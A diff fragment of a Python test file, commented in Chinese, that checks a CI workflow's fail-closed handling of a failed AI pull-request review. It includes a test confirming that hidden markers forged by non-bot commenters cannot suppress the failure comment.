+def test_failclosed_does_not_repeat_comment(tmp_path, step, login):
+    _existing_comments(tmp_path, ("someone", "舊的"), (login, f"{FAILED_MARKER} AI review 沒有完成"))
+    res = _run_failclosed_path(tmp_path, step)
+    assert (res.returncode == 0) is (step == FAILCLOSED_STEP), res.stderr
     calls = _calls(tmp_path)
     assert "pr edit 1 --add-label needs-work" in calls, "label 一定要加"
     assert "pr comment" not in calls, "已經有同樣的留言就不要再貼"
+
+
+@pytest.mark.parametrize("step", [FAILCLOSED_STEP, VERDICT_STEP])
+def test_forged_marker_from_non_bot_does_not_suppress_comment(tmp_path, step):
+    """任何人都能在 PR 留言貼上隱藏標記；只有 Actions bot 自己的留言才算數。"""
+    _existing_comments(tmp_path, ("attacker", FAILED_MARKER), ("github-actions-evil", FAILED_MARKER))
+    _run_failclosed_path(tmp_path, step)
+    calls = _calls(tmp_path)
+    assert "pr edit 1 --add-label needs-work" in calls
+    assert "pr comment 1 --body-file review-failed.md" in calls, "非 bot 貼的標記不能讓失敗留言消失"
+    assert calls.index("pr edit 1 --add-label needs-work") < calls.index("pr view"), "先加 label"
 
 
 def test_failclosed_label_added_even_if_comment_query_fails(tmp_path):
